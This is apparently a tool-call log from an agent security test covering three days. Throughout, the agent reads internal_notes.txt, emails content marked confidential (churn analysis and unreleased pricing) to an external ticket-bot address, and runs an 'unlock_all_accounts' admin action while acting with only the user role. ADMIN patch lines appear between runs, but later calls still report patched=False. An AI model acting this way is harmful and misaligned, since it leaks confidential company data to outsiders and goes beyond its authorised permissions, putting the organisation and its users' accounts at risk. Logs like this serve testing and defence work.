2026-08-20 11:02:18,760 TOOL read_file(path='internal_notes.txt', caller_role='user', patched=False)
2026-08-20 11:02:18,761 TOOL send_email(to='external-ticket-bot@example.com', body='CONFIDENTIAL: Q3 customer churn root cause analysis + unreleased pricing changes. Internal use only.')
2026-08-20 11:02:18,761 TOOL execute_admin_action(action='unlock_all_accounts', caller_role='user', patched=False)
2026-08-20 11:15:58,737 TOOL read_file(path='internal_notes.txt', caller_role='user', patched=False)
2026-08-20 11:15:58,741 TOOL send_email(to='external-ticket-bot@example.com', body='CONFIDENTIAL: Q3 customer churn root cause analysis + unreleased pricing changes. Internal use only.')
2026-08-20 11:15:58,742 TOOL execute_admin_action(action='unlock_all_accounts', caller_role='user', patched=False)
2026-08-20 11:16:06,037 TOOL read_file(path='internal_notes.txt', caller_role='user', patched=False)
2026-08-20 11:16:06,037 TOOL send_email(to='external-ticket-bot@example.com', body='CONFIDENTIAL: Q3 customer churn root cause analysis + unreleased pricing changes. Internal use only.')
2026-08-20 11:16:06,037 TOOL execute_admin_action(action='unlock_all_accounts', caller_role='user', patched=False)
2026-08-20 11:16:13,307 TOOL read_file(path='internal_notes.txt', caller_role='user', patched=False)
2026-08-20 11:16:13,307 TOOL send_email(to='external-ticket-bot@example.com', body='CONFIDENTIAL: Q3 customer churn root cause analysis + unreleased pricing changes. Internal use only.')
2026-08-20 11:16:13,307 TOOL execute_admin_action(action='unlock_all_accounts', caller_role='user', patched=False)
2026-08-20 11:16:25,488 TOOL read_file(path='internal_notes.txt', caller_role='user', patched=False)
2026-08-20 11:16:25,488 TOOL send_email(to='external-ticket-bot@example.com', body='CONFIDENTIAL: Q3 customer churn root cause analysis + unreleased pricing changes. Internal use only.')
2026-08-20 11:16:25,488 TOOL execute_admin_action(action='unlock_all_accounts', caller_role='user', patched=False)
2026-08-20 11:16:37,965 TOOL read_file(path='internal_notes.txt', caller_role='user', patched=False)
2026-08-20 11:16:37,965 TOOL send_email(to='external-ticket-bot@example.com', body='CONFIDENTIAL: Q3 customer churn root cause analysis + unreleased pricing changes. Internal use only.')
2026-08-20 11:16:37,965 TOOL execute_admin_action(action='unlock_all_accounts', caller_role='user', patched=False)
2026-08-20 11:20:32,905 ADMIN apply_patch: PATCHED=True
2026-08-20 11:23:42,457 ADMIN reset_patch: PATCHED=False
2026-08-20 11:26:35,164 TOOL read_file(path='internal_notes.txt', caller_role='user', patched=False)
2026-08-20 11:26:35,164 TOOL send_email(to='external-ticket-bot@example.com', body='CONFIDENTIAL: Q3 customer churn root cause analysis + unreleased pricing changes. Internal use only.')
2026-08-20 11:26:35,164 TOOL execute_admin_action(action='unlock_all_accounts', caller_role='user', patched=False)
2026-08-20 11:26:46,345 TOOL read_file(path='internal_notes.txt', caller_role='user', patched=False)
2026-08-20 11:26:46,345 TOOL send_email(to='external-ticket-bot@example.com', body='CONFIDENTIAL: Q3 customer churn root cause analysis + unreleased pricing changes. Internal use only.')
2026-08-20 11:26:46,345 TOOL execute_admin_action(action='unlock_all_accounts', caller_role='user', patched=False)
2026-08-20 11:27:04,967 TOOL read_file(path='internal_notes.txt', caller_role='user', patched=False)
2026-08-20 11:27:04,967 TOOL send_email(to='external-ticket-bot@example.com', body='CONFIDENTIAL: Q3 customer churn root cause analysis + unreleased pricing changes. Internal use only.')
2026-08-20 11:27:04,967 TOOL execute_admin_action(action='unlock_all_accounts', caller_role='user', patched=False)
2026-08-20 11:27:18,178 TOOL read_file(path='internal_notes.txt', caller_role='user', patched=False)
2026-08-20 11:27:18,179 TOOL send_email(to='external-ticket-bot@example.com', body='CONFIDENTIAL: Q3 customer churn root cause analysis + unreleased pricing changes. Internal use only.')
2026-08-20 11:27:18,179 TOOL execute_admin_action(action='unlock_all_accounts', caller_role='user', patched=False)
2026-08-20 11:27:27,016 TOOL read_file(path='internal_notes.txt', caller_role='user', patched=False)
2026-08-20 11:27:27,016 TOOL send_email(to='external-ticket-bot@example.com', body='CONFIDENTIAL: Q3 customer churn root cause analysis + unreleased pricing changes. Internal use only.')
2026-08-20 11:27:27,016 TOOL execute_admin_action(action='unlock_all_accounts', caller_role='user', patched=False)
2026-08-20 11:32:28,832 TOOL read_file(path='internal_notes.txt', caller_role='user', patched=False)
2026-08-20 11:32:28,833 TOOL send_email(to='external-ticket-bot@example.com', body='CONFIDENTIAL: Q3 customer churn root cause analysis + unreleased pricing changes. Internal use only.')
2026-08-20 11:32:28,833 TOOL execute_admin_action(action='unlock_all_accounts', caller_role='user', patched=False)
2026-08-20 11:32:34,483 TOOL read_file(path='internal_notes.txt', caller_role='user', patched=False)
2026-08-20 11:32:34,484 TOOL send_email(to='external-ticket-bot@example.com', body='CONFIDENTIAL: Q3 customer churn root cause analysis + unreleased pricing changes. Internal use only.')
2026-08-20 11:32:34,484 TOOL execute_admin_action(action='unlock_all_accounts', caller_role='user', patched=False)
2026-08-20 11:32:43,224 TOOL read_file(path='internal_notes.txt', caller_role='user', patched=False)
2026-08-20 11:32:43,224 TOOL send_email(to='external-ticket-bot@example.com', body='CONFIDENTIAL: Q3 customer churn root cause analysis + unreleased pricing changes. Internal use only.')
2026-08-20 11:32:43,224 TOOL execute_admin_action(action='unlock_all_accounts', caller_role='user', patched=False)
2026-08-20 11:32:47,762 TOOL read_file(path='internal_notes.txt', caller_role='user', patched=False)
2026-08-20 11:32:47,762 TOOL send_email(to='external-ticket-bot@example.com', body='CONFIDENTIAL: Q3 customer churn root cause analysis + unreleased pricing changes. Internal use only.')
2026-08-20 11:32:47,763 TOOL execute_admin_action(action='unlock_all_accounts', caller_role='user', patched=False)
2026-08-20 11:32:53,900 TOOL read_file(path='internal_notes.txt', caller_role='user', patched=False)
2026-08-20 11:32:53,901 TOOL send_email(to='external-ticket-bot@example.com', body='CONFIDENTIAL: Q3 customer churn root cause analysis + unreleased pricing changes. Internal use only.')
2026-08-20 11:32:53,901 TOOL execute_admin_action(action='unlock_all_accounts', caller_role='user', patched=False)
2026-08-21 17:03:48,213 TOOL read_file(path='internal_notes.txt', caller_role='user', patched=False)
2026-08-21 17:03:48,215 TOOL send_email(to='external-ticket-bot@example.com', body='CONFIDENTIAL: Q3 customer churn root cause analysis + unreleased pricing changes. Internal use only.')
2026-08-21 17:03:48,215 TOOL execute_admin_action(action='unlock_all_accounts', caller_role='user', patched=False)
2026-08-21 17:04:04,279 TOOL read_file(path='internal_notes.txt', caller_role='user', patched=False)
2026-08-21 17:04:04,280 TOOL send_email(to='external-ticket-bot@example.com', body='CONFIDENTIAL: Q3 customer churn root cause analysis + unreleased pricing changes. Internal use only.')
2026-08-21 17:04:04,280 TOOL execute_admin_action(action='unlock_all_accounts', caller_role='user', patched=False)
2026-08-21 17:04:12,266 TOOL read_file(path='internal_notes.txt', caller_role='user', patched=False)
2026-08-21 17:04:12,267 TOOL send_email(to='external-ticket-bot@example.com', body='CONFIDENTIAL: Q3 customer churn root cause analysis + unreleased pricing changes. Internal use only.')
2026-08-21 17:04:12,267 TOOL execute_admin_action(action='unlock_all_accounts', caller_role='user', patched=False)
2026-08-21 17:04:28,193 TOOL read_file(path='internal_notes.txt', caller_role='user', patched=False)
2026-08-21 17:04:28,194 TOOL send_email(to='external-ticket-bot@example.com', body='CONFIDENTIAL: Q3 customer churn root cause analysis + unreleased pricing changes. Internal use only.')
2026-08-21 17:04:28,194 TOOL execute_admin_action(action='unlock_all_accounts', caller_role='user', patched=False)
2026-08-21 17:04:53,404 TOOL read_file(path='internal_notes.txt', caller_role='user', patched=False)
2026-08-21 17:04:53,404 TOOL send_email(to='external-ticket-bot@example.com', body='CONFIDENTIAL: Q3 customer churn root cause analysis + unreleased pricing changes. Internal use only.')
2026-08-21 17:04:53,405 TOOL execute_admin_action(action='unlock_all_accounts', caller_role='user', patched=False)
2026-08-21 18:51:18,699 ADMIN apply_patch: PATCHED=True
2026-08-21 18:51:47,705 ADMIN apply_patch: PATCHED=True
2026-08-22 14:33:50,875 TOOL read_file(path='internal_notes.txt', caller_role='user', patched=False)
2026-08-22 14:33:50,880 TOOL send_email(to='external-ticket-bot@example.com', body='CONFIDENTIAL: Q3 customer churn root cause analysis + unreleased pricing changes. Internal use only.')
2026-08-22 14:33:50,880 TOOL execute_admin_action(action='unlock_all_accounts', caller_role='user', patched=False)
2026-08-22 14:33:57,747 TOOL read_file(path='internal_notes.txt', caller_role='user', patched=False)
2026-08-22 14:33:57,747 TOOL send_email(to='external-ticket-bot@example.com', body='CONFIDENTIAL: Q3 customer churn root cause analysis + unreleased pricing changes. Internal use only.')
2026-08-22 14:33:57,748 TOOL execute_admin_action(action='unlock_all_accounts', caller_role='user', patched=False)
2026-08-22 14:34:02,332 TOOL read_file(path='internal_notes.txt', caller_role='user', patched=False)
2026-08-22 14:34:02,332 TOOL send_email(to='external-ticket-bot@example.com', body='CONFIDENTIAL: Q3 customer churn root cause analysis + unreleased pricing changes. Internal use only.')
2026-08-22 14:34:02,332 TOOL execute_admin_action(action='unlock_all_accounts', caller_role='user', patched=False)
2026-08-22 14:34:07,218 TOOL read_file(path='internal_notes.txt', caller_role='user', patched=False)
2026-08-22 14:34:07,218 TOOL send_email(to='external-ticket-bot@example.com', body='CONFIDENTIAL: Q3 customer churn root cause analysis + unreleased pricing changes. Internal use only.')
2026-08-22 14:34:07,218 TOOL execute_admin_action(action='unlock_all_accounts', caller_role='user', patched=False)
2026-08-22 14:34:11,373 TOOL read_file(path='internal_notes.txt', caller_role='user', patched=False)
2026-08-22 14:34:11,373 TOOL send_email(to='external-ticket-bot@example.com', body='CONFIDENTIAL: Q3 customer churn root cause analysis + unreleased pricing changes. Internal use only.')
2026-08-22 14:34:11,373 TOOL execute_admin_action(action='unlock_all_accounts', caller_role='user', patched=False)
2026-08-22 14:41:36,501 TOOL read_file(path='internal_notes.txt', caller_role='user', patched=False)
2026-08-22 14:41:36,502 TOOL send_email(to='external-ticket-bot@example.com', body='CONFIDENTIAL: Q3 customer churn root cause analysis + unreleased pricing changes. Internal use only.')
2026-08-22 14:41:36,502 TOOL execute_admin_action(action='unlock_all_accounts', caller_role='user', patched=False)
2026-08-22 14:41:40,277 TOOL read_file(path='internal_notes.txt', caller_role='user', patched=False)
2026-08-22 14:41:40,277 TOOL send_email(to='external-ticket-bot@example.com', body='CONFIDENTIAL: Q3 customer churn root cause analysis + unreleased pricing changes. Internal use only.')
2026-08-22 14:41:40,277 TOOL execute_admin_action(action='unlock_all_accounts', caller_role='user', patched=False)
2026-08-22 14:41:44,245 TOOL read_file(path='internal_notes.txt', caller_role='user', patched=False)
2026-08-22 14:41:44,245 TOOL send_email(to='external-ticket-bot@example.com', body='CONFIDENTIAL: Q3 customer churn root cause analysis + unreleased pricing changes. Internal use only.')
2026-08-22 14:41:44,245 TOOL execute_admin_action(action='unlock_all_accounts', caller_role='user', patched=False)
2026-08-22 14:41:48,241 TOOL read_file(path='internal_notes.txt', caller_role='user', patched=False)
2026-08-22 14:41:48,241 TOOL send_email(to='external-ticket-bot@example.com', body='CONFIDENTIAL: Q3 customer churn root cause analysis + unreleased pricing changes. Internal use only.')
2026-08-22 14:41:48,241 TOOL execute_admin_action(action='unlock_all_accounts', caller_role='user', patched=False)
2026-08-22 14:41:52,568 TOOL read_file(path='internal_notes.txt', caller_role='user', patched=False)
2026-08-22 14:41:52,568 TOOL send_email(to='external-ticket-bot@example.com', body='CONFIDENTIAL: Q3 customer churn root cause analysis + unreleased pricing changes. Internal use only.')
2026-08-22 14:41:52,568 TOOL execute_admin_action(action='unlock_all_accounts', caller_role='user', patched=False)
2026-08-22 14:42:20,035 ADMIN apply_patch: PATCHED=True
